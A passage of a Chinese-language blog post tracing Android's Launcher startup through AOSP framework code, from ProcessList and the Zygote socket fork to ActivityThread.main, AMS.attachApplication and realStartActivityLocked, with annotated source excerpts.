meminfo来查看当前所有进程的分类情况，接着来看下ProcessList.startProcessLocked():<br><strong>frameworks/base/services/core/java/com/android/server/am/ProcessList.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> ProcessRecord <span class="title function_">startProcessLocked</span><span class="params">(String processName, ApplicationInfo info,</span></span><br><span class="line"><span class="params">        <span class="type">boolean</span> knownToBeDead, <span class="type">int</span> intentFlags, HostingRecord hostingRecord,</span></span><br><span class="line"><span class="params">        <span class="type">boolean</span> allowWhileBooting, <span class="type">boolean</span> isolated, <span class="type">int</span> isolatedUid, <span class="type">boolean</span> keepIfLarge,</span></span><br><span class="line"><span class="params">        String abiOverride, String entryPoint, String[] entryPointArgs, Runnable crashHandler)</span> &#123;</span><br><span class="line">    </span><br><span class="line">    ProcessRecord app;</span><br><span class="line">    ... ...</span><br><span class="line">    checkSlow(startTime, <span class="string">&quot;startProcess: stepping in to startProcess&quot;</span>);</span><br><span class="line">    <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">success</span> <span class="operator">=</span> startProcessLocked(app, hostingRecord, abiOverride);</span><br><span class="line">    checkSlow(startTime, <span class="string">&quot;startProcess: done starting proc!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> success ? app : <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">boolean</span> <span class="title function_">startProcessLocked</span><span class="params">(ProcessRecord app, HostingRecord hostingRecord,</span></span><br><span class="line"><span class="params">        <span class="type">boolean</span> disableHiddenApiChecks, <span class="type">boolean</span> mountExtStorageFull,</span></span><br><span class="line"><span class="params">        String abiOverride)</span> &#123;</span><br><span class="line">        ... ...</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        ... ...</span><br><span class="line">        <span class="comment">// Start the process.  It will either succeed and return a result containing</span></span><br><span class="line">        <span class="comment">// the PID of the new process, or else throw a RuntimeException.</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">entryPoint</span> <span class="operator">=</span> <span class="string">&quot;android.app.ActivityThread&quot;</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> startProcessLocked(hostingRecord, entryPoint, app, uid, gids,</span><br><span class="line">                runtimeFlags, mountExternal, seInfo, requiredAbi, instructionSet, invokeWith,</span><br><span class="line">                startTime);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RuntimeException e) &#123;</span><br><span class="line">        Slog.e(ActivityManagerService.TAG, <span class="string">&quot;Failure starting process &quot;</span> + app.processName, e);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// Something went very wrong while trying to start this process; one</span></span><br><span class="line">        <span class="comment">// common case is when the package is frozen due to an active</span></span><br><span class="line">        <span class="comment">// upgrade. To recover, clean up any active bookkeeping related to</span></span><br><span class="line">        <span class="comment">// starting this process. (We already invoked this method once when</span></span><br><span class="line">        <span class="comment">// the package was initially frozen through KILL_APPLICATION_MSG, so</span></span><br><span class="line">        <span class="comment">// it doesn&#x27;t hurt to use it again.)</span></span><br><span class="line">        mService.forceStopPackageLocked(app.info.packageName, UserHandle.getAppId(app.uid),</span><br><span class="line">                <span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">true</span>, <span class="literal">false</span>, <span class="literal">false</span>, app.userId, <span class="string">&quot;start failure&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">boolean</span> <span class="title function_">startProcessLocked</span><span class="params">(HostingRecord hostingRecord,String entryPoint,</span></span><br><span class="line"><span class="params">        ProcessRecord app, <span class="type">int</span> uid, <span class="type">int</span>[] gids, <span class="type">int</span> runtimeFlags, <span class="type">int</span> mountExternal,</span></span><br><span class="line"><span class="params">        String seInfo, String requiredAbi, String instructionSet, String invokeWith,<span class="type">long</span> startTime)</span> &#123;</span><br><span class="line">        ... ...</span><br><span class="line">        <span class="keyword">final</span> Process.<span class="type">ProcessStartResult</span> <span class="variable">startResult</span> <span class="operator">=</span> startProcess(app.hostingRecord,entryPoint, app, app.startUid, gids, runtimeFlags, mountExternal,app.seInfo, requiredAbi, instructionSet, invokeWith, app.startTime);</span><br><span class="line">        ... ...</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">private</span> Process.ProcessStartResult <span class="title function_">startProcess</span><span class="params">(HostingRecord hostingRecord, String entryPoint,</span></span><br><span class="line"><span class="params">        ProcessRecord app, <span class="type">int</span> uid, <span class="type">int</span>[] gids, <span class="type">int</span> runtimeFlags, <span class="type">int</span> mountExternal,</span></span><br><span class="line"><span class="params">        String seInfo, String requiredAbi, String instructionSet, String invokeWith,</span></span><br><span class="line"><span class="params">        <span class="type">long</span> startTime)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Trace.traceBegin(Trace.TRACE_TAG_ACTIVITY_MANAGER, <span class="string">&quot;Start proc: &quot;</span> +</span><br><span class="line">                app.processName);</span><br><span class="line">        checkSlow(startTime, <span class="string">&quot;startProcess: asking zygote to start proc&quot;</span>);</span><br><span class="line">        <span class="keyword">final</span> Process.ProcessStartResult startResult;</span><br><span class="line">        <span class="keyword">if</span> (hostingRecord.usesWebviewZygote()) &#123;</span><br><span class="line">            ... ...</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (hostingRecord.usesAppZygote()) &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">AppZygote</span> <span class="variable">appZygote</span> <span class="operator">=</span> createAppZygoteForProcessIfNeeded(app);</span><br><span class="line"> </span><br><span class="line">            startResult = appZygote.getProcess().start(entryPoint,</span><br><span class="line">                    app.processName, uid, uid, gids, runtimeFlags, mountExternal,</span><br><span class="line">                    app.info.targetSdkVersion, seInfo, requiredAbi, instructionSet,</span><br><span class="line">                    app.info.dataDir, <span class="literal">null</span>, app.info.packageName,</span><br><span class="line">                    <span class="comment">/*useUsapPool=*/</span> <span class="literal">false</span>,</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;PROC_START_SEQ_IDENT + app.startSeq&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            ... ...</span><br><span class="line">        &#125;</span><br><span class="line">        checkSlow(startTime, <span class="string">&quot;startProcess: returned from zygote!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> startResult;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        Trace.traceEnd(Trace.TRACE_TAG_ACTIVITY_MANAGER);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有几个我们需要关注的点，一个是第二个方法定义的entryPoint=”android.app.ActivityThread”，这个就是后面创建进程时会通过反射调用到的类，再来看最后一个方法，这里会执行else if语句，也就是执行ZygoteProcess的start（）方法。最终到 ZygoteProcess 的attemptUsapSendArgsAndGetResult 通过 Socket 通信，fork 一个新的 Launcher 进程，调用过程如图：</p><p><img src="/images/20231125/20231125002.jpg"></p><p>ZygoteProcess.attemptZygoteSendArgsAndGetResult()<br><strong>frameworks/base/core/java/android/os/ZygoteProcess.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Process.ProcessStartResult <span class="title function_">attemptZygoteSendArgsAndGetResult</span><span class="params">(</span></span><br><span class="line"><span class="params">        ZygoteState zygoteState, String msgStr)</span> <span class="keyword">throws</span> ZygoteStartFailedEx &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">BufferedWriter</span> <span class="variable">zygoteWriter</span> <span class="operator">=</span> zygoteState.mZygoteOutputWriter;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">DataInputStream</span> <span class="variable">zygoteInputStream</span> <span class="operator">=</span> zygoteState.mZygoteInputStream;</span><br><span class="line"> </span><br><span class="line">        zygoteWriter.write(msgStr);把应用进程的一些参数写给前面连接的zygote进程</span><br><span class="line">        zygoteWriter.flush();<span class="comment">//进入Zygote进程，处于阻塞状态</span></span><br><span class="line">        <span class="comment">//从socket中得到zygote创建的应用pid，赋值给 ProcessStartResult的对象</span></span><br><span class="line">        Process.<span class="type">ProcessStartResult</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Process</span>.ProcessStartResult();</span><br><span class="line">        result.pid = zygoteInputStream.readInt();</span><br><span class="line">        result.usingWrapper = zygoteInputStream.readBoolean();</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">        zygoteState.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Zygote进程处理<br>ZygoteInit.main<br><strong>frameworks/base/core/java/com/android/internal/os/ZygoteInit.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String argv[])</span> &#123;</span><br><span class="line">    Runnable caller;</span><br><span class="line">    <span class="keyword">if</span> (startSystemServer) &#123;</span><br><span class="line">        <span class="comment">//Zygote Fork出的第一个进程 SystmeServer</span></span><br><span class="line">        <span class="type">Runnable</span> <span class="variable">r</span> <span class="operator">=</span> forkSystemServer(abiList, zygoteSocketName, zygoteServer);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (r != <span class="literal">null</span>) &#123;</span><br><span class="line">            r.run();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//循环等待fork出其他的应用进程，比如Launcher</span></span><br><span class="line">    caller = zygoteServer.runSelectLoop(abiList);</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (caller != <span class="literal">null</span>) &#123;</span><br><span class="line">        caller.run(); <span class="comment">//执行runSelectLoop返回的Runnable对象，进入子进程</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ZygoteServer.runSelectLoop<br><strong>frameworks/base/core/java/com/android/internal/os/ZygoteServer.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Runnable <span class="title function_">runSelectLoop</span><span class="params">(String abiList)</span> &#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="type">int</span> pollReturnValue;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">//epoll机制 循环</span></span><br><span class="line">                pollReturnValue = Os.poll(pollFDs, pollTimeoutMs);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ErrnoException ex) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;poll failed&quot;</span>, ex);</span><br><span class="line">            &#125;</span><br><span class="line">            ...</span><br><span class="line">            <span class="comment">//来了消息后，调用processOneCommand()来进行进程的处理</span></span><br><span class="line">            <span class="keyword">final</span> <span class="type">Runnable</span> <span class="variable">command</span> <span class="operator">=</span>  connection.processOneCommand(<span class="built_in">this</span>);</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ZygoteConnection.processOneCommand<br><strong>frameworks/base/core/java/com/android/internal/os/ZygoteConnection.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Runnable <span class="title function_">processOneCommand</span><span class="params">(ZygoteServer zygoteServer)</span> &#123;</span><br><span class="line">            <span class="comment">//fork进程，得到新进程pid</span></span><br><span class="line">            <span class="comment">//pid=0 表示Zygote  fork子进程成功</span></span><br><span class="line">            <span class="comment">//pid &gt; 0 表示子进程 的真正的PID</span></span><br><span class="line">            pid = Zygote.forkAndSpecialize(parsedArgs.mUid, parsedArgs.mGid, parsedArgs.mGids,</span><br><span class="line">                parsedArgs.mRuntimeFlags, rlimits, parsedArgs.mMountExternal, parsedArgs.mSeInfo,</span><br><span class="line">                parsedArgs.mNiceName, fdsToClose, fdsToIgnore, parsedArgs.mStartChildZygote,</span><br><span class="line">                parsedArgs.mInstructionSet, parsedArgs.mAppDataDir, parsedArgs.mIsTopApp,</span><br><span class="line">                parsedArgs.mPkgDataInfoList, parsedArgs.mWhitelistedDataInfoList,</span><br><span class="line">                parsedArgs.mBindMountAppDataDirs, parsedArgs.mBindMountAppStorageDirs);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//fork成功，第一次返回的pid = 0</span></span><br><span class="line">            <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> handleChildProc(parsedArgs, childPipeFd, parsedArgs.mStartChildZygote);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                handleParentProc(pid, serverPipeFd);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ZygoteConnection.handleChildProc<br>这里主要执行到 ZygoteInit.zygoteInit，zygoteInit 进行一些环境的初始化、启动Binder进程等操作，最终反射执行 ActivityThread.main<br><strong>frameworks/base/core/java/com/android/internal/os/ZygoteConnection.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Runnable <span class="title function_">handleChildProc</span><span class="params">(ZygoteArguments parsedArgs,</span></span><br><span class="line"><span class="params">        FileDescriptor pipeFd, <span class="type">boolean</span> isZygote)</span> &#123;</span><br><span class="line">    closeSocket();</span><br><span class="line">    Zygote.setAppProcessName(parsedArgs, TAG);</span><br><span class="line">        <span class="keyword">if</span> (!isZygote) &#123;</span><br><span class="line">            <span class="comment">//App进程将会调用到这里，最终反射执行ActivityThread.main</span></span><br><span class="line">            <span class="keyword">return</span> ZygoteInit.zygoteInit(parsedArgs.mTargetSdkVersion,</span><br><span class="line">                    parsedArgs.mDisabledCompatChanges,</span><br><span class="line">                    parsedArgs.mRemainingArgs, <span class="literal">null</span> <span class="comment">/* classLoader */</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> ZygoteInit.childZygoteInit(parsedArgs.mTargetSdkVersion,</span><br><span class="line">                    parsedArgs.mRemainingArgs, <span class="literal">null</span> <span class="comment">/* classLoader */</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Zygote进程调用栈:</p><p><img src="/images/20231125/20231125003.jpg"></p><p>ActivityThread中处理<br>Zygote fork出了 Launcher 的进程，并把接下来的 Launcher 启动任务交给了 ActivityThread 来进行，接下来我们就从 ActivityThread.main方法来分析 Launcher 的创建过程。<br><strong>frameworks/base/core/java/android/app/ActivityThread.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    Trace.traceBegin(Trace.TRACE_TAG_ACTIVITY_MANAGER, <span class="string">&quot;ActivityThreadMain&quot;</span>);</span><br><span class="line">    ... ...</span><br><span class="line">    <span class="comment">//创建主线程Looper</span></span><br><span class="line">    Looper.prepareMainLooper();</span><br><span class="line">    ... ...</span><br><span class="line">    <span class="type">ActivityThread</span> <span class="variable">thread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ActivityThread</span>();</span><br><span class="line">    <span class="comment">//执行attach</span></span><br><span class="line">    ... ...</span><br><span class="line">    thread.attach(<span class="literal">false</span>, startSeq);</span><br><span class="line">    <span class="comment">//开启循环</span></span><br><span class="line">    ... ...</span><br><span class="line">    Looper.loop();</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;Main thread loop unexpectedly exited&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就是android层面划分为一个应用进程的开始，初始化一个looper，也就是android中说的主线程，并开始looper循环，这里调用到了ActivitThread.attach() :<br><strong>frameworks/base/core/java/android/app/ActivityThread.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">attach</span><span class="params">(<span class="type">boolean</span> system, <span class="type">long</span> startSeq)</span> &#123;</span><br><span class="line">    sCurrentActivityThread = <span class="built_in">this</span>;</span><br><span class="line">    mSystemThread = system;</span><br><span class="line">    <span class="keyword">if</span> (!system) &#123;</span><br><span class="line">        ... ...</span><br><span class="line">        <span class="comment">// 这里会拿到ActivityManagerService的代理</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">IActivityManager</span> <span class="variable">mgr</span> <span class="operator">=</span> ActivityManager.getService();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="comment">//应用的句柄发给AMS，从而使AMS可以管理新进程</span></span><br><span class="line">            mgr.attachApplication(mAppThread, startSeq);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> ex.rethrowFromSystemServer();</span><br><span class="line">        &#125;</span><br><span class="line">         ... ...</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 在前面讲Zygote进程的时候，里面创建ActivityThread就会执行到这里</span></span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//当系统配置发生变更时会执行这个回调</span></span><br><span class="line">    ViewRootImpl.<span class="type">ConfigChangedCallback</span> <span class="variable">configChangedCallback</span></span><br><span class="line">            <span class="operator">=</span> (Configuration globalConfig) -&gt; &#123;</span><br><span class="line">        ... ...</span><br><span class="line">    &#125;;</span><br><span class="line">    ViewRootImpl.addConfigCallback(configChangedCallback);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里会执行if语句里面的内容，mAppThread的类型是ApplicationThread，这个类的主要作用是在ActivityManagerService中回调回ActivityThread中来，mgr是ActivityManagerService的代理，在执行它的ActivityManagerService.attachApplication() 方法：<br><strong>frameworks/base/services/core/java/com/android/server/am/ActivityManagerService.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">attachApplication</span><span class="params">(IApplicationThread thread, <span class="type">long</span> startSeq)</span> &#123;</span><br><span class="line">    <span class="keyword">synchronized</span> (<span class="built_in">this</span>) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">callingPid</span> <span class="operator">=</span> Binder.getCallingPid();</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">callingUid</span> <span class="operator">=</span> Binder.getCallingUid();</span><br><span class="line">        <span class="keyword">final</span> <span class="type">long</span> <span class="variable">origId</span> <span class="operator">=</span> Binder.clearCallingIdentity();</span><br><span class="line">        attachApplicationLocked(thread, callingPid, callingUid, startSeq);</span><br><span class="line">        Binder.restoreCallingIdentity(origId);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ActivityManagerService.attachApplicationLocked()<br>调用AMS的 attachApplication()，最终层层调用到 ActivityStackSupervisor 的 realStartActivityLocked，真正准备去启动Activity。<br><strong>frameworks/base/services/core/java/com/android/server/am/ActivityManagerService.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">attachApplicationLocked</span><span class="params">(IApplicationThread thread,<span class="type">int</span> pid, <span class="type">int</span> callingUid, <span class="type">long</span> startSeq)</span> &#123;</span><br><span class="line">    ... ...</span><br><span class="line">    <span class="comment">//这里会去调用ActivityThrea的bindApplication(),也就是会去创建Application</span></span><br><span class="line">    thread.bindApplication(... ...)</span><br><span class="line">    ... ...</span><br><span class="line">    <span class="comment">//如果当前的Application记录仍然依附到之前的进程中，则清理掉</span></span><br><span class="line">    <span class="keyword">if</span> (app.thread != <span class="literal">null</span>) &#123;</span><br><span class="line">        handleAppDiedLocked(app, <span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ... ...</span><br><span class="line">    <span class="comment">// See if the top visible activity is waiting to run in this process...</span></span><br><span class="line">    <span class="keyword">if</span> (normalMode) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//调用ActivityTaskManagerService的attachApplication()，最终层层调用到ActivityStackSupervisor.java的 realStartActivityLocked()</span></span><br><span class="line">            didSomething = mAtmInternal.attachApplication(app.getWindowProcessController());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            Slog.wtf(TAG, <span class="string">&quot;Exception thrown launching activities in &quot;</span> + app, e);</span><br><span class="line">            badApp = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ... ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里通过AMS最终会调用到ActivityStackSupervisor.realStartActivityLocked()：<br><strong>frameworks/base/services/core/java/com/android/server/wm/ActivityStackSupervisor.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">boolean</span> <span class="title function_">realStartActivityLocked</span><span class="params">(ActivityRecord r, WindowProcessController proc,</span></span><br><span class="line"><span class="params">        <span class="type">boolean</span> andResume, <span class="type">boolean</span> checkConfig)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="comment">//确保所有的Activity执行了onPause才会往下继续执行</span></span><br><span class="line">    <span class="keyword">if</span> (!mRootActivityContainer.allPausedActivitiesComplete()) &#123;</span><br><span class="line">        <span class="comment">// While there are activities pausing we skipping starting any new activities until</span></span><br><span class="line">        <span class="comment">// pauses are complete. <span class="doctag">NOTE:</span> that we also do this for activities that are starting in</span></span><br><span class="line">        <span class="comment">// the paused state because they will first be resumed then paused on the client side.</span></span><br><span class="line">        <span class="keyword">if</span> (DEBUG_SWITCH || DEBUG_PAUSE || DEBUG_STATES) Slog.v(TAG_PAUSE,</span><br><span class="line">                <span class="string">&quot;realStartActivityLocked: Skipping start of r=&quot;</span> + r</span><br><span class="line">                + <span class="string">&quot; some activities pausing...&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ... ...</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        ... ...</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            ... ...</span><br><span class="line">            <span class="comment">// Create activity launch transaction.</span></span><br><span class="line">            <span class="keyword">final</span> <span class="type">ClientTransaction</span> <span 